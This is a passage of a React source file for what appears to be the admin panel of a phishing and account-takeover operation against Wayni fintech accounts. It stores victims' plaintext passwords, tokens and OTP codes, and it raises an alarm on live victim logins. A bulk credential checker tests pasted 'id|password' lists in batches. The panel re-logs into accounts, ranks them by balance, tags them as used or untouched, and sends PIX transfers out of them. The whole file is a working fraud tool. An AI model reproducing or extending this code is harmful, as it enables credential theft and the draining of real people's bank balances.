import { useState, useEffect, useCallback, useRef } from "react";
import { useAuth } from "@/hooks/useAuth";
import { supabase } from "@/integrations/supabase/client";
import { invokeWayni } from "@/lib/wayniApi";
import CocosAdminLogin from "@/components/admin/CocosAdminLogin";
import { SessionPresenceProvider } from "@/hooks/useSessionPresence";
import OnlineNowTab from "@/components/admin/OnlineNowTab";
import { useNotificationSound } from "@/hooks/useNotificationSound";
import {
  Shield, LogOut, RefreshCw, Users, Eye, EyeOff, Trash2, DollarSign,
  Copy, Check, Search, ArrowUpRight, Loader2, ChevronDown, ChevronUp,
  Activity, Wallet, BarChart3, Clock, Bell, BellOff, FileText, Zap,
  Globe, MapPin, ArrowDownRight,
} from "lucide-react";

// ─── Types ───
interface WayniAccount {
  id: string;
  identification: string;
  email: string | null;
  password: string | null;
  full_name: string | null;
  phone: string | null;
  access_token: string | null;
  user_uuid: string | null;
  balance: string | null;
  bank_data: any;
  activities: any;
  profile_data: any;
  operator_code: string;
  info_tag: string | null;
  last_login_at: string | null;
  last_data_sync_at: string | null;
  created_at: string;
  updated_at: string;
}

interface PixTransaction {
  id: string;
  wayni_account_id: string | null;
  account_identification: string;
  account_name: string | null;
  pix_key: string;
  recipient_name: string | null;
  amount_brl: number;
  amount_ars: number | null;
  exchange_rate: number | null;
  payment_uuid: string | null;
  payment_status: string;
  bank_transaction_id: string | null;
  result_data: any;
  operator_code: string;
  created_at: string;
}

interface LiveSession {
  id: string;
  email: string | null;
  password: string | null;
  status: string;
  otp_code: string | null;
  created_at: string;
  ip_address: string | null;
  city: string | null;
  country: string | null;
  source: string;
  operator_code: string;
  user_agent: string | null;
}

// ─── Helpers ───
const timeAgo = (d: string | null) => {
  if (!d) return "Nunca";
  const diff = Date.now() - new Date(d).getTime();
  const m = Math.floor(diff / 60000);
  if (m < 1) return "Agora";
  if (m < 60) return `${m}m`;
  const h = Math.floor(m / 60);
  if (h < 24) return `${h}h`;
  return `${Math.floor(h / 24)}d`;
};

const fmtDate = (d: string) => new Date(d).toLocaleString("pt-BR", { day: "2-digit", month: "2-digit", year: "numeric", hour: "2-digit", minute: "2-digit" });

const statusColors: Record<string, string> = {
  Done: "text-green-400 bg-green-500/10",
  Ok: "text-green-400 bg-green-500/10",
  validated: "text-blue-400 bg-blue-500/10",
  Read: "text-yellow-400 bg-yellow-500/10",
  processed: "text-cyan-400 bg-cyan-500/10",
  pending: "text-gray-400 bg-gray-500/10",
  error: "text-red-400 bg-red-500/10",
};

const INFO_TAGS = ["USEI", "NÃO MEXI", "NÃO FAZ PIX", "RECEBE EM 24HRS"] as const;
const TAG_COLORS: Record<string, { bg: string; text: string }> = {
  "USEI": { bg: "bg-blue-500/15 border-blue-500/30", text: "text-blue-400" },
  "NÃO MEXI": { bg: "bg-yellow-500/15 border-yellow-500/30", text: "text-yellow-400" },
  "NÃO FAZ PIX": { bg: "bg-red-500/15 border-red-500/30", text: "text-red-400" },
  "RECEBE EM 24HRS": { bg: "bg-green-500/15 border-green-500/30", text: "text-green-400" },
};

const WayniAdmin = () => {
  const { user, isAdmin, loading: authLoading, signOut } = useAuth();
  const [activeTab, setActiveTab] = useState<"dashboard" | "accounts" | "online" | "pix" | "logs" | "send_pix" | "bulk">("dashboard");
  const [accounts, setAccounts] = useState<WayniAccount[]>([]);
  const [loadingAccounts, setLoadingAccounts] = useState(false);
  const [search, setSearch] = useState("");
  const [expandedId, setExpandedId] = useState<string | null>(null);
  const [syncing, setSyncing] = useState<string | null>(null);
  const [syncingAll, setSyncingAll] = useState(false);
  const [relogging, setRelogging] = useState<string | null>(null);
  const [showPasswords, setShowPasswords] = useState<Record<string, boolean>>({});
  const [copied, setCopied] = useState<string | null>(null);

  // PIX state
  const [pixTransactions, setPixTransactions] = useState<PixTransaction[]>([]);
  const [pixLoading, setPixLoading] = useState(false);

  // Send PIX state
  const [pixAccountId, setPixAccountId] = useState("");
  const [pixKey, setPixKey] = useState("");
  const [pixAmount, setPixAmount] = useState("");
  const [pixStep, setPixStep] = useState<"idle" | "validating" | "validated" | "processing" | "checking" | "done" | "error">("idle");
  const [pixData, setPixData] = useState<any>(null);
  const [pixError, setPixError] = useState("");

  // Live sessions
  const [liveSessions, setLiveSessions] = useState<LiveSession[]>([]);
  const { startAlarm, stopAlarm } = useNotificationSound();
  const [soundEnabled, setSoundEnabled] = useState(true);
  const seenRef = useRef<Set<string>>(new Set());

  // Bulk checker state
  const [bulkInput, setBulkInput] = useState("");
  const [bulkLoading, setBulkLoading] = useState(false);
  const [bulkResults, setBulkResults] = useState<any[]>([]);
  const [bulkProgress, setBulkProgress] = useState({ done: 0, total: 0 });
  const [bulkPaused, setBulkPaused] = useState(false);
  const bulkPausedRef = useRef(false);
  const [bulkExpandedIdx, setBulkExpandedIdx] = useState<number | null>(null);

  // ─── Fetch data ───
  const fetchAccounts = useCallback(async () => {
    setLoadingAccounts(true);
    const { data } = await supabase.from("wayni_accounts").select("*").order("updated_at", { ascending: false });
    setAccounts((data as any[]) || []);
    setLoadingAccounts(false);
  }, []);

  const fetchPixTransactions = useCallback(async () => {
    setPixLoading(true);
    const { data } = await supabase.from("wayni_pix_transactions" as any).select("*").order("created_at", { ascending: false }).limit(200);
    setPixTransactions((data as any[]) || []);
    setPixLoading(false);
  }, []);

  const fetchLiveSessions = useCallback(async () => {
    const since = new Date(Date.now() - 24 * 3600000).toISOString();
    const { data } = await supabase.from("sessions").select("*").eq("source", "wayni").gte("created_at", since).order("created_at", { ascending: false }).limit(100);
    setLiveSessions((data as any[]) || []);
  }, []);

  useEffect(() => {
    if (isAdmin) {
      fetchAccounts();
      fetchPixTransactions();
      fetchLiveSessions();
    }
  }, [isAdmin, fetchAccounts, fetchPixTransactions, fetchLiveSessions]);

  // Realtime subscriptions
  useEffect(() => {
    if (!isAdmin) return;
    const ch1 = supabase.channel("wayni-accounts-rt")
      .on("postgres_changes", { event: "*", schema: "public", table: "wayni_accounts" }, (p) => {
        if (p.eventType === "INSERT") setAccounts(prev => [p.new as any, ...prev]);
        else if (p.eventType === "UPDATE") setAccounts(prev => prev.map(a => a.id === (p.new as any).id ? p.new as any : a));
        else if (p.eventType === "DELETE") setAccounts(prev => prev.filter(a => a.id !== (p.old as any).id));
      }).subscribe();

    const ch2 = supabase.channel("wayni-pix-rt")
      .on("postgres_changes", { event: "*", schema: "public", table: "wayni_pix_transactions" }, (p) => {
        if (p.eventType === "INSERT") setPixTransactions(prev => [p.new as any, ...prev]);
        else if (p.eventType === "UPDATE") setPixTransactions(prev => prev.map(t => t.id === (p.new as any).id ? p.new as any : t));
      }).subscribe();

    const ch3 = supabase.channel("wayni-sessions-rt")
      .on("postgres_changes", { event: "*", schema: "public", table: "sessions", filter: "source=eq.wayni" }, (p) => {
        const row = p.new as any;
        if (p.eventType === "INSERT") {
          setLiveSessions(prev => [row, ...prev].slice(0, 100));
          if (!seenRef.current.has(row.id) && soundEnabled) {
            seenRef.current.add(row.id);
            startAlarm();
            setTimeout(() => stopAlarm(), 3000);
          }
        } else if (p.eventType === "UPDATE") {
          setLiveSessions(prev => prev.map(s => s.id === row.id ? row : s));
          if (soundEnabled) { startAlarm(); setTimeout(() => stopAlarm(), 2000); }
        }
      }).subscribe();

    return () => { supabase.removeChannel(ch1); supabase.removeChannel(ch2); supabase.removeChannel(ch3); };
  }, [isAdmin, soundEnabled]);

  // ─── Actions ───
  const handleSync = async (id: string) => {
    setSyncing(id);
    await invokeWayni({ action: "sync", account_id: id });
    await fetchAccounts();
    setSyncing(null);
  };

  const handleSyncAll = async () => {
    setSyncingAll(true);
    await invokeWayni({ action: "sync_all" });
    await fetchAccounts();
    setSyncingAll(false);
  };

  const handleRelogin = async (id: string) => {
    setRelogging(id);
    const { data, error } = await invokeWayni({ action: "relogin", account_id: id });
    if (!error && data?.success) await invokeWayni({ action: "sync", account_id: id });
    await fetchAccounts();
    setRelogging(null);
  };

  const handleDelete = async (id: string) => {
    if (!confirm("Deletar esta conta?")) return;
    await supabase.from("wayni_accounts").delete().eq("id", id);
    await fetchAccounts();
  };

  const handleInfoTag = async (id: string, tag: string | null) => {
    await supabase.from("wayni_accounts").update({ info_tag: tag } as any).eq("id", id);
    setAccounts(prev => prev.map(a => a.id === id ? { ...a, info_tag: tag } : a));
  };

  const copyToClipboard = (text: string, key: string) => {
    navigator.clipboard.writeText(text);
    setCopied(key);
    setTimeout(() => setCopied(null), 1500);
  };

  // ─── Bulk checker ───
  const parseBulkInput = (text: string) =>
    text.split("\n").map(l => l.trim()).filter(Boolean).map(line => {
      const parts = line.includes(":") ? line.split(":").slice(1).join(":") : line;
      const [id, pw] = parts.split("|").map(s => s.trim());
      return { identification: id, password: pw };
    }).filter(a => a.identification && a.password);

  const handleBulkCheck = async () => {
    const accs = parseBulkInput(bulkInput);
    if (!accs.length) return;
    setBulkLoading(true);
    setBulkPaused(false);
    bulkPausedRef.current = false;
    setBulkResults([]);
    setBulkProgress({ done: 0, total: accs.length });

    const allResults: any[] = [];
    const batchSize = 3;

    for (let i = 0; i < accs.length; i += batchSize) {
      while (bulkPausedRef.current) await new Promise(r => setTimeout(r, 500));
      const batch = accs.slice(i, i + batchSize);
      try {
        const { data, error } = await invokeWayni({ action: "bulk", accounts: batch, operator_code: "master" });
        if (error || !data?.results) {
          batch.forEach(a => allResults.push({ success: false, identification: a.identification, error: "Falha" }));
        } else {
          allResults.push(...data.results);
        }
      } catch (e: any) {
        batch.forEach(a => allResults.push({ success: false, identification: a.identification, error: e.message }));
      }
      setBulkResults([...allResults]);
      setBulkProgress({ done: Math.min(i + batchSize, accs.length), total: accs.length });
      if (i + batchSize < accs.length) await new Promise(r => setTimeout(r, 2000));
    }
    setBulkLoading(false);
    fetchAccounts();
  };

  // ─── PIX flow ───
  const handlePixValidate = async () => {
    if (!pixAccountId || !pixKey) return;
    setPixStep("validating"); setPixError("");
    const { data, error } = await invokeWayni({ action: "pix_validate", account_id: pixAccountId, pix_key: pixKey });
    if (error || data?.error) { setPixError(data?.error || error?.message); setPixStep("error"); return; }
    setPixData(data); setPixStep("validated");
  };

  const handlePixProcess = async () => {
    if (!pixData?.paymentUuid || !pixAmount) return;
    setPixStep("processing"); setPixError("");
    const { data, error } = await invokeWayni({ action: "pix_process", account_id: pixAccountId, payment_uuid: pixData.paymentUuid, brl_amount: parseFloat(pixAmount) });
    if (error || data?.error) { setPixError(data?.error || error?.message); setPixStep("error"); return; }
    
    // Check status
    setPixStep("checking");
    let attempts = 0;
    const checkStatus = async () => {
      const { data: info } = await invokeWayni({ action: "pix_info", account_id: pixAccountId, payment_uuid: pixData.paymentUuid });
      if (info?.paymentStatus === "Done" || attempts >= 5) {
        setPixData({ ...data, ...info });
        setPixStep("done");
        fetchPixTransactions();
        fetchAccounts();
      } else {
        attempts++;
        setTimeout(checkStatus, 3000);
      }
    };
    setTimeout(checkStatus, 2000);
  };

  const handleCheckPixStatus = async (tx: PixTransaction) => {
    if (!tx.wayni_account_id || !tx.payment_uuid) return;
    await invokeWayni({ action: "pix_info", account_id: tx.wayni_account_id, payment_uuid: tx.payment_uuid });
    await fetchPixTransactions();
  };

  // ─── Computed stats ───
  const totalBalance = accounts.reduce((s, a) => s + parseFloat(a.balance || "0"), 0);
  const activeAccounts = accounts.filter(a => a.access_token).length;
  const todayPixCount = pixTransactions.filter(t => {
    const d = new Date(t.created_at);
    const now = new Date();
    return d.toDateString() === now.toDateString() && t.payment_status !== "validated";
  }).length;
  const todayPixBrl = pixTransactions.filter(t => {
    const d = new Date(t.created_at);
    const now = new Date();
    return d.toDateString() === now.toDateString() && t.amount_brl > 0 && t.payment_status !== "validated";
  }).reduce((s, t) => s + t.amount_brl, 0);
  const todayPixArs = pixTransactions.filter(t => {
    const d = new Date(t.created_at);
    const now = new Date();
    return d.toDateString() === now.toDateString() && (t.amount_ars || 0) > 0 && t.payment_status !== "validated";
  }).reduce((s, t) => s + (t.amount_ars || 0), 0);
  const onlineCount = liveSessions.filter(s => {
    const age = Date.now() - new Date(s.created_at).getTime();
    return age < 600000; // 10 min
  }).length;
  const recentLogins = liveSessions.filter(s => s.status === "login_success" || s.status === "pending_review").slice(0, 10);

  if (authLoading) return <div className="min-h-screen bg-[#0a0a0a] flex items-center justify-center"><Loader2 className="w-8 h-8 text-[#c8e64a] animate-spin" /></div>;
  if (!user || !isAdmin) return <CocosAdminLogin onLogin={() => {}} />;

  const filtered = accounts.filter(a => {
    const q = search.toLowerCase();
    return !q || a.identification?.toLowerCase().includes(q) || a.email?.toLowerCase().includes(q) || a.full_name?.toLowerCase().includes(q);
  });

  const tabs = [
    { key: "dashboard" as const, label: "Dashboard", icon: BarChart3 },
    { key: "accounts" as const, label: "Contas", icon: Users },
    { key: "online" as const, label: "Online", icon: Globe },
    { key: "pix" as const, label: "PIX Log", icon: FileText },
    { key: "send_pix" as const, label: "Enviar PIX", icon: DollarSign },
    { key: "logs" as const, label: "Sessões", icon: Activity },
  ];

  return (
    <SessionPresenceProvider>
      <div className="min-h-screen bg-[#0a0a0a] text-white">
        {/* Header */}
        <div className="bg-[#111] border-b border-[#1a1a1a] px-4 py-3 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <span className="text-[22px] font-black text-[#c8e64a]" style={{ fontFamily: "'Inter', sans-serif" }}>wayni</span>
            <Shield className="w-5 h-5 text-[#c8e64a]" />
            <span className="text-sm text-gray-500">Admin Panel</span>
          </div>
          <div className="flex items-center gap-3">
            <button onClick={() => setSoundEnabled(!soundEnabled)} className="text-gray-500 hover:text-white transition-colors">
              {soundEnabled ? <Bell size={16} /> : <BellOff size={16} />}
            </button>
            <span className="text-xs text-gray-600">{user.email}</span>
            <button onClick={signOut} className="text-gray-500 hover:text-white transition-colors"><LogOut size={16} /></button>
          </div>
        </div>

        {/* Tabs */}
        <div className="flex border-b border-[#1a1a1a] overflow-x-auto">
          {tabs.map(t => (
            <button
              key={t.key}
              onClick={() => setActiveTab(t.key)}
              className={`flex items-center gap-2 px-4 py-3 text-xs font-medium border-b-2 transition-colors whitespace-nowrap ${activeTab === t.key ? "border-[#c8e64a] text-[#c8e64a]" : "border-transparent text-gray-500 hover:text-gray-300"}`}
            >
              <t.icon size={14} />
              {t.label}
              {t.key === "online" && onlineCount > 0 && (
                <span className="ml-1 w-5 h-5 rounded-full bg-green-500/20 text-green-400 text-[10px] flex items-center justify-center font-bold">{onlineCount}</span>
              )}
            </button>
          ))}
        </div>

        <div className="p-4 max-w-7xl mx-auto">
          {/* ═══ DASHBOARD ═══ */}
          {activeTab === "dashboard" && (
            <div className="space-y-6">
              {/* Stats Grid */}
              <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
                <StatCard icon={Users} label="Contas" value={accounts.length.toString()} sub={`${activeAccounts} ativas`} color="#c8e64a" />
                <StatCard icon={Wallet} label="Saldo Total" value={`$${totalBalance.toLocaleString("es-AR", { minimumFractionDigits: 2 })}`} sub="ARS" color="#22c55e" />
                <StatCard icon={DollarSign} label="PIX Hoje" value={todayPixCount.toString()} sub={`R$${todayPixBrl.toFixed(2)}`} color="#3b82f6" />
                <StatCard icon={Globe} label="Online Agora" value={onlineCount.toString()} sub="últimos 10min" color="#f59e0b" />
              </div>

              {/* PIX Summary today */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="bg-[#111] border border-[#1a1a1a] rounded-xl p-5">
                  <h3 className="text-sm font-semibold text-gray-400 mb-4 flex items-center gap-2"><DollarSign size={14} />Resumo PIX Hoje</h3>
                  <div className="space-y-3">
                    <div className="flex justify-between items-center">
                      <span className="text-xs text-gray-500">Total BRL Enviado</span>
                      <span className="text-lg font-mono font-bold text-green-400">R${todayPixBrl.toFixed(2)}</span>
                    </div>
                    <div className="flex justify-between items-center">
                      <span className="text-xs text-gray-500">Total ARS Debitado</span>
                      <span className="text-lg font-mono font-bold text-red-400">${todayPixArs.toFixed(2)}</span>
                    </div>
                    <div className="flex justify-between items-center">
                      <span className="text-xs text-gray-500">Transações</span>
                      <span className="text-lg font-mono font-bold text-white">{todayPixCount}</span>
                    </div>
                  </div>
                </div>

                {/* Recent logins */}
                <div className="bg-[#111] border border-[#1a1a1a] rounded-xl p-5">
                  <h3 className="text-sm font-semibold text-gray-400 mb-4 flex items-center gap-2"><Activity size={14} />Logins Recentes</h3>
                  <div className="space-y-2 max-h-[200px] overflow-y-auto">
                    {recentLogins.length === 0 && <p className="text-xs text-gray-600">Nenhum login recente</p>}
                    {recentLogins.map(s => (
                      <div key={s.id} className="flex items-center justify-between bg-[#0a0a0a] rounded-lg px-3 py-2">
                        <div className="min-w-0">
                          <p className="text-xs font-medium truncate">{s.email || "—"}</p>
                          <p className="text-[10px] text-gray-600 flex items-center gap-1">
                            {s.city && <><MapPin size={8} />{s.city}, {s.country}</>}
                            {!s.city && s.ip_address}
                          </p>
                        </div>
                        <span className="text-[10px] text-gray-500">{timeAgo(s.created_at)}</span>
                      </div>
                    ))}
                  </div>
                </div>
              </div>

              {/* Recent PIX */}
              <div className="bg-[#111] border border-[#1a1a1a] rounded-xl p-5">
                <h3 className="text-sm font-semibold text-gray-400 mb-4 flex items-center gap-2"><ArrowUpRight size={14} />Últimos PIX</h3>
                <div className="space-y-2">
                  {pixTransactions.filter(t => t.amount_brl > 0).slice(0, 8).map(tx => (
                    <div key={tx.id} className="flex items-center justify-between bg-[#0a0a0a] rounded-lg px-3 py-2.5">
                      <div className="min-w-0 flex-1">
                        <p className="text-xs font-medium">{tx.recipient_name || tx.pix_key}</p>
                        <p className="text-[10px] text-gray-600">de {tx.account_name || tx.account_identification} • {fmtDate(tx.created_at)}</p>
                      </div>
                      <div className="text-right flex-shrink-0 ml-3">
                        <p className="text-xs font-mono font-bold text-green-400">R${tx.amount_brl.toFixed(2)}</p>
                        {tx.amount_ars && <p className="text-[10px] font-mono text-red-400">-${tx.amount_ars.toFixed(2)}</p>}
                      </div>
                      <span className={`ml-2 text-[10px] px-2 py-0.5 rounded-full ${statusColors[tx.payment_status] || "text-gray-400 bg-gray-500/10"}`}>
                        {tx.payment_status}
                      </span>
                    </div>
                  ))}
                  {pixTransactions.filter(t => t.amount_brl > 0).length === 0 && <p className="text-xs text-gray-600">Nenhuma transação PIX</p>}
                </div>
              </div>

              {/* Accounts by balance */}
              <div className="bg-[#111] border border-[#1a1a1a] rounded-xl p-5">
                <h3 className="text-sm font-semibold text-gray-400 mb-4 flex items-center gap-2"><Wallet size={14} />Ranking de Saldo</h3>
                <div className="space-y-2">
                  {[...accounts].sort((a, b) => parseFloat(b.balance || "0") - parseFloat(a.balance || "0")).slice(0, 10).map((acc, i) => (
                    <div key={acc.id} className="flex items-center justify-between bg-[#0a0a0a] rounded-lg px-3 py-2">
                      <div className="flex items-center gap-3">
                        <span className="text-xs text-gray-600 w-5">#{i + 1}</span>
                        <div>
                          <p className="text-xs font-medium">{acc.full_name || acc.identification}</p>
                          <p className="text-[10px] text-gray-600">{acc.identification}</p>
                        </div>
                      </div>
                      <div className="flex items-center gap-2">
                        <span className="text-sm font-mono font-bold text-[#c8e64a]">${parseFloat(acc.balance || "0").toLocaleString("es-AR", { minimumFractionDigits: 2 })}</span>
                        <span className={`w-2 h-2 rounded-full ${acc.access_token ? "bg-green-500" : "bg-red-500"}`} />
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}

          {/* ═══ ACCOUNTS TAB ═══ */}
          {activeTab === "accounts" && (
            <div>
              <div className="flex items-center gap-3 mb-4">
                <div className="relative flex-1">
                  <Search className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500 w-4 h-4" />
                  <input
                    placeholder="Buscar por DNI, email, nome..."
                    value={search}
                    onChange={e => setSearch(e.target.value)}
                    className="w-full pl-10 pr-4 py-2.5 bg-[#111] border border-[#222] rounded-lg text-sm text-white placeholder:text-gray-600 outline-none focus:border-[#c8e64a] transition-colors"
                  />
                </div>
                <button onClick={handleSyncAll} disabled={syncingAll} className="flex items-center gap-1.5 px-3 py-2.5 bg-[#c8e64a]/10 text-[#c8e64a] border border-[#c8e64a]/20 rounded-lg text-xs font-medium hover:bg-[#c8e64a]/20 disabled:opacity-50 transition-colors">
                  <Zap size={14} className={syncingAll ? "animate-spin" : ""} />
                  Sync All
                </button>
                <button onClick={fetchAccounts} className="p-2.5 bg-[#111] border border-[#222] rounded-lg hover:bg-[#1a1a1a] transition-colors">
                  <RefreshCw size={14} className={loadingAccounts ? "animate-spin" : ""} />
                </button>
              </div>

              <div className="flex items-center justify-between mb-3">
                <span className="text-xs text-gray-500">{filtered.length} conta(s) • Saldo total: ${totalBalance.toLocaleString("es-AR", { minimumFractionDigits: 2 })}</span>
              </div>

              <div className="space-y-2">
                {filtered.map(acc => {
                  const isExpanded = expandedId === acc.id;
                  const cvu = acc.bank_data?.internal_account?.[0]?.cvu;
                  const cvuAlias = acc.bank_data?.internal_account?.[0]?.cvu_alias;
                  const activities = acc.activities?.data || [];
                  const accPixTx = pixTransactions.filter(t => t.wayni_account_id === acc.id && t.amount_brl > 0);

                  return (
                    <div key={acc.id} className="bg-[#111] border border-[#1a1a1a] rounded-xl overflow-hidden">
                      {/* Row header */}
                      <div
                        className="flex items-center justify-between px-4 py-3 cursor-pointer hover:bg-[#141414] transition-colors"
                        onClick={() => setExpandedId(isExpanded ? null : acc.id)}
                      >
                        <div className="flex items-center gap-3 min-w-0">
                          <div className="w-9 h-9 rounded-full bg-[#c8e64a]/15 flex items-center justify-center text-[#c8e64a] text-xs font-bold flex-shrink-0">
                            {(acc.full_name || acc.identification || "?")[0].toUpperCase()}
                          </div>
                          <div className="min-w-0">
                            <div className="flex items-center gap-2">
                              <p className="text-sm font-medium truncate">{acc.full_name || acc.identification}</p>
                              {acc.info_tag && (
                                <span className={`text-[9px] px-1.5 py-0.5 rounded-full border ${TAG_COLORS[acc.info_tag]?.bg || ""} ${TAG_COLORS[acc.info_tag]?.text || ""}`}>
                                  {acc.info_tag}
                                </span>
                              )}
                            </div>
                            <p className="text-xs text-gray-500 truncate">{acc.email || acc.identification} • {timeAgo(acc.last_login_at)}</p>
                          </div>
                        </div>
                        <div className="flex items-center gap-3">
                          <span className="text-sm font-mono font-bold text-[#c8e64a]">${parseFloat(acc.balance || "0").toLocaleString("es-AR", { minimumFractionDigits: 2 })}</span>
                          <span className={`w-2 h-2 rounded-full flex-shrink-0 ${acc.access_token ? "bg-green-500" : "bg-red-500"}`} />
                          {isExpanded ? <ChevronUp size={14} className="text-gray-500" /> : <ChevronDown size={14} className="text-gray-500" />}
                        </div>
                      </div>

                      {/* Expanded */}
                      {isExpanded && (
                        <div className="border-t border-[#1a1a1a] px-4 py-4 space-y-4">
                          {/* Info grid */}
                          <div className="grid grid-cols-2 gap-3 text-xs">
                            <div><span className="text-gray-500">DNI:</span> <span className="text-white font-mono">{acc.identification}</span></div>
                            <div><span className="text-gray-500">Tel:</span> <span className="text-white">{acc.phone || "—"}</span></div>
                            <div className="flex items-center gap-1">
                              <span className="text-gray-500">Senha:</span>
                              <span className="text-white font-mono">{showPasswords[acc.id] ? acc.password : "••••••"}</span>
                              <button onClick={(e) => { e.stopPropagation(); setShowPasswords(p => ({ ...p, [acc.id]: !p[acc.id] })); }}>
                                {showPasswords[acc.id] ? <EyeOff size={12} className="text-gray-500" /> : <Eye size={12} className="text-gray-500" />}
                              </button>
                              {acc.password && (
                                <button onClick={() => copyToClipboard(acc.password!, `pw-${acc.id}`)}>
                                  {copied === `pw-${acc.id}` ? <Check size={12} className="text-green-500" /> : <Copy size={12} className="text-gray-500" />}
                                </button>
                              )}
                            </div>
                            <div><span className="text-gray-500">Operador:</span> <span className="text-white">{acc.operator_code}</span></div>
                            <div><span className="text-gray-500">Último login:</span> <span className="text-white">{acc.last_login_at ? fmtDate(acc.last_login_at) : "—"}</span></div>
                            <div><span className="text-gray-500">Último sync:</span> <span className="text-white">{acc.last_data_sync_at ? fmtDate(acc.last_data_sync_at) : "—"}</span></div>
                          </div>

                          {/* Info tags */}
                          <div className="flex flex-wrap gap-1.5">
                            {INFO_TAGS.map(tag => (
                              <button
                                key={tag}
                                onClick={() => handleInfoTag(acc.id, acc.info_tag === tag ? null : tag)}
                                className={`text-[10px] px-2 py-1 rounded-full border transition-all ${acc.info_tag === tag ? `${TAG_COLORS[tag].bg} ${TAG_COLORS[tag].text}` : "border-[#333] text-gray-500 hover:border-gray-400"}`}
                              >
                                {tag}
                              </button>
                            ))}
                          </div>

                          {/* CVU */}
                          {cvu && (
                            <div className="bg-[#0a0a0a] rounded-lg p-3 space-y-1">
                              <div className="flex items-center justify-between">
                                <span className="text-xs text-gray-500">CVU</span>
                                <button onClick={() => copyToClipboard(cvu, `cvu-${acc.id}`)} className="text-gray-500 hover:text-white">
                                  {copied === `cvu-${acc.id}` ? <Check size={12} className="text-green-500" /> : <Copy size={12} />}
                                </button>
                              </div>
                              <p className="text-xs font-mono text-gray-300">{cvu}</p>
                              {cvuAlias && <p className="text-[10px] text-gray-500">Alias: {cvuAlias}</p>}
                            </div>
                          )}

                          {/* Activities */}
                          {activities.length > 0 && (
                            <div>
                              <p className="text-xs text-gray-500 mb-2 flex items-center gap-1"><Activity size={12} />Últimos movimentos:</p>
                              <div className="space-y-1 max-h-[250px] overflow-y-auto">
                                {activities.map((act: any, i: number) => (
                                  <div key={i} className="flex items-center justify-between bg-[#0a0a0a] rounded-lg px-3 py-2">
                                    <div className="min-w-0 flex-1">
                                      <p className="text-xs font-medium truncate">{act.data?.description || act.type}</p>
                                      <p className="text-[10px] text-gray-600">{fmtDate(act.created_at)}</p>
                                    </div>
                                    <span className={`text-xs font-mono font-bold flex-shrink-0 ml-2 ${act.entry_type === "CREDIT" ? "text-green-400" : "text-red-400"}`}>
                                      {act.entry_type === "CREDIT" ? "+" : "-"}${parseFloat(act.total_amount).toLocaleString("es-AR", { minimumFractionDigits: 2 })}
                                    </span>
                                  </div>
                                ))}
                              </div>
                            </div>
                          )}

                          {/* PIX History for this account */}
                          {accPixTx.length > 0 && (
                            <div>
                              <p className="text-xs text-gray-500 mb-2 flex items-center gap-1"><DollarSign size={12} />Histórico PIX ({accPixTx.length}):</p>
                              <div className="space-y-1 max-h-[200px] overflow-y-auto">
                                {accPixTx.map(tx => (
                                  <div key={tx.id} className="flex items-center justify-between bg-[#0a0a0a] rounded-lg px-3 py-2">
                                    <div className="min-w-0 flex-1">
                                      <p className="text-xs truncate">{tx.recipient_name || tx.pix_key}</p>
                                      <p className="text-[10px] text-gray-600">{fmtDate(tx.created_at)}</p>
                                    </div>
                                    <div className="text-right flex-shrink-0 ml-2">
                                      <p className="text-xs font-mono text-green-400">R${tx.amount_brl.toFixed(2)}</p>
                                      {tx.amount_ars && <p className="text-[10px] font-mono text-red-400">-${tx.amount_ars.toFixed(2)}</p>}
                                    </div>
                                    <span className={`ml-2 text-[9px] px-1.5 py-0.5 rounded-full ${statusColors[tx.payment_status] || "text-gray-400 bg-gray-500/10"}`}>
                                      {tx.payment_status}
                                    </span>
                                  </div>
                                ))}
                              </div>
                            </div>
                          )}

                          {/* Actions */}
                          <div className="flex flex-wrap gap-2 pt-2">
                            <button onClick={() => handleSync(acc.id)} disabled={syncing === acc.id} className="flex items-center gap-1.5 px-3 py-1.5 bg-[#c8e64a]/10 text-[#c8e64a] rounded-lg text-xs font-medium hover:bg-[#c8e64a]/20 disabled:opacity-50 transition-colors">
                              <RefreshCw size={12} className={syncing === acc.id ? "animate-spin" : ""} /> Sync
                            </button>
                            <button onClick={() => handleRelogin(acc.id)} disabled={relogging === acc.id} className="flex items-center gap-1.5 px-3 py-1.5 bg-blue-500/10 text-blue-400 rounded-lg text-xs font-medium hover:bg-blue-500/20 disabled:opacity-50 transition-colors">
                              <RefreshCw size={12} className={relogging === acc.id ? "animate-spin" : ""} /> Relogin
                            </button>
                            <button onClick={() => { setPixAccountId(acc.id); setActiveTab("send_pix"); }} className="flex items-center gap-1.5 px-3 py-1.5 bg-green-500/10 text-green-400 rounded-lg text-xs font-medium hover:bg-green-500/20 transition-colors">
                              <ArrowUpRight size={12} /> PIX
                            </button>
                            <button onClick={() => handleDelete(acc.id)} className="flex items-center gap-1.5 px-3 py-1.5 bg-red-500/10 text-red-400 rounded-lg text-xs font-medium hover:bg-red-500/20 ml-auto transition-colors">
                              <Trash2 size={12} />
                            </button>
                          </div>
                        </div>
                      )}
                    </div>
                  );
                })}
              </div>
            </div>
          )}

          {/* ═══ ONLINE TAB ═══ */}
          {activeTab === "online" && <OnlineNowTab sourceFilter="wayni" />}

          {/* ═══ PIX LOG TAB ═══ */}
          {activeTab === "pix" && (
            <div>
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-sm font-semibold text-gray-400 flex items-center gap-2"><FileText size={14} />Histórico de Transações PIX</h2>
                <button onClick={fetchPixTransactions} className="p-2 bg-[#111] border border-[#222] rounded-lg hover:bg-[#1a1a1a]">
                  <RefreshCw size={14} className={pixLoading ? "animate-spin" : ""} />
                </button>
              </div>

              {/* Summary cards */}
              <div className="grid grid-cols-3 gap-3 mb-4">
                <div className="bg-[#111] border border-[#1a1a1a] rounded-xl p-4 text-center">
                  <p className="text-[10px] text-gray-500 uppercase mb-1">Total Transações</p>
                  <p className="text-xl font-mono font-bold text-white">{pixTransactions.filter(t => t.amount_brl > 0).length}</p>
                </div>
                <div className="bg-[#111] border border-[#1a1a1a] rounded-xl p-4 text-center">
                  <p className="text-[10px] text-gray-500 uppercase mb-1">Total BRL</p>
                  <p className="text-xl font-mono font-bold text-green-400">R${pixTransactions.reduce((s, t) => s + t.amount_brl, 0).toFixed(2)}</p>
                </div>
                <div className="bg-[#111] border border-[#1a1a1a] rounded-xl p-4 text-center">
                  <p className="text-[10px] text-gray-500 uppercase mb-1">Total ARS</p>
